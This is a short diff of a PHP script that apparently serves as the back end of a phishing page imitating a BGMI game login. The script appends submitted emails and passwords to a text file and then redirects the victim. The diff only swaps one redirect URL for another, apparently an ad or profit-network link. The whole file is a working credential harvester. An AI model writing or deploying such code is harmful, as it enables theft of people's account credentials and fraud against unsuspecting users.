@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "BGMI Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://curioushingefast.com/vkjj0mzb9?key=22f7b28b1ab6735bd4320503cba3ab9a');
+header('Location: https://www.videosprofitnetwork.com/watch.xml?key=080281f148d8edc6d8d718ea010b5cdf');
 exit();
 ?>
